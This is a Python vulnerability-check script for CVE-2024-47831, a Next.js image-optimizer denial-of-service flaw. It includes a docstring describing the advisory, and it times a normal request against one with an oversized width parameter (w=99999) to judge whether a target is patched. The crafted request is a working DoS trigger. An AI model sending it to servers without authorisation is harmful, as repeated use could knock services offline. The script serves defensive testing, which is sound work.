#!/usr/bin/env python3
"""
CVE-2024-47831 — Next.js Image Optimizer Denial of Service
===========================================================

CVE ID      : CVE-2024-47831
GHSA        : GHSA-g77x-44xx-532m
CVSS Score  : 5.9 (MEDIUM)
CVSS Vector : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
Affected    : Next.js >= 10.0.0, < 14.2.7
Patched     : 14.2.7
Published   : 2024-10-14

Description
-----------
The Next.js built-in image optimization endpoint (`/_next/image`) processes
images on demand. By requesting a crafted URL with an extremely large `w`
(width) or `q` (quality) parameter, or by supplying a URL to a very large
external image, an attacker can cause the Next.js server to consume excessive
CPU and memory during image processing, resulting in denial of service.

The vulnerability is in the lack of strict validation of incoming optimization
parameters before committing to processing work.

Attack Surface
--------------
- Any Next.js application using the `<Image>` component (which uses /_next/image)
- Self-hosted Next.js deployments (Vercel applies platform-level limits)
- The /_next/image endpoint is publicly accessible without authentication

Test Methodology
---------------
1. Confirm the /_next/image endpoint exists and responds (200 or 400).
2. Probe with an oversized `w` parameter (e.g., w=99999) and measure response
   time vs a normal request.
3. A significantly longer response time with the large parameter suggests the
   server is doing unbounded work (vulnerable).
4. Report timing difference — we do NOT actually trigger a DoS; we just measure
   latency signals.

Safety note: This script uses a single probe request with a large width
parameter. It does not flood the server with requests.

Remediation
-----------
Upgrade Next.js to >= 14.2.7.
Additional mitigation: configure `images.minimumCacheTTL` and
`images.deviceSizes`/`images.imageSizes` in next.config.js to limit
the accepted width values. Rate-limit /_next/image at your CDN/proxy.

References
----------
- https://github.com/advisories/GHSA-g77x-44xx-532m
- https://nvd.nist.gov/vuln/detail/CVE-2024-47831
"""

from __future__ import annotations

import argparse
import time
import urllib.error
import urllib.parse
import urllib.request


def fetch_timed(url: str, timeout: int = 30) -> tuple[int, float]:
    headers = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "image/*,*/*"}
    req = urllib.request.Request(url, headers=headers)
    start = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            _ = resp.read(1024)
            status = resp.status
    except urllib.error.HTTPError as exc:
        status = exc.code
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc
    elapsed = time.monotonic() - start
    return status, elapsed


def build_image_url(target: str, src: str, w: int, q: int = 75) -> str:
    params = urllib.parse.urlencode({"url": src, "w": w, "q": q})
    return f"{target.rstrip('/')}/_next/image?{params}"


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2024-47831] Next.js Image Optimizer DoS")
    print(f"Target : {target}")
    print("-" * 60)

    # Use a small public image as the source for the optimization request.
    # We choose a tiny image so the network transfer is fast; the point is
    # to compare processing time between normal and large-width requests.
    test_image_src = "https://via.placeholder.com/10"

    # Baseline: normal width (128px)
    normal_url = build_image_url(target, test_image_src, w=128)
    if verbose:
        print(f"  Baseline URL : {normal_url}")

    try:
        normal_status, normal_time = fetch_timed(normal_url, timeout=timeout)
    except ConnectionError as exc:
        print(f"  Connection error on baseline: {exc}")
        print("\nVERDICT : INCONCLUSIVE")
        return 2

    if verbose:
        print(f"  Baseline status={normal_status}  time={normal_time:.2f}s")

    if normal_status == 404:
        print("  /_next/image endpoint returned 404 — image optimizer not enabled or not Next.js.")
        print("\nVERDICT : NOT APPLICABLE")
        return 0

    # Probe: oversized width (99999px)
    oversized_url = build_image_url(target, test_image_src, w=99999)
    if verbose:
        print(f"  Oversized URL: {oversized_url}")

    try:
        oversized_status, oversized_time = fetch_timed(oversized_url, timeout=timeout)
    except ConnectionError as exc:
        print(f"  Connection error on oversized probe: {exc}")
        print("\nVERDICT : INCONCLUSIVE")
        return 2

    if verbose:
        print(f"  Oversized status={oversized_status}  time={oversized_time:.2f}s")

    print()
    slowdown = oversized_time / normal_time if normal_time > 0 else 0

    if oversized_status == 400:
        print("VERDICT : PATCHED")
        print("\nServer rejected w=99999 with 400 Bad Request.")
        print("Input validation is in place (patched behavior).")
        return 0
    elif oversized_status == 200 and slowdown > 3.0:
        print("VERDICT : LIKELY VULNERABLE")
        print(f"\nServer accepted w=99999 (status={oversized_status}).")
        print(f"Response time: {oversized_time:.2f}s vs baseline {normal_time:.2f}s ({slowdown:.1f}x slower).")
        print("Significant slowdown suggests unbounded image processing work.")
        print("Fix: Upgrade Next.js to >= 14.2.7")
        return 1
    elif oversized_status == 200:
        print("VERDICT : INCONCLUSIVE")
        print(f"\nServer accepted w=99999 (status={oversized_status}) but response time was")
        print(f"only {slowdown:.1f}x slower than baseline ({normal_time:.2f}s → {oversized_time:.2f}s).")
        print("Could be patched, cached, or the test image was too small to show timing.")
        return 2
    else:
        print("VERDICT : INCONCLUSIVE")
        print(f"\nUnexpected status={oversized_status} for oversized request.")
        return 2


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2024-47831 Next.js image optimizer DoS")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=30)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
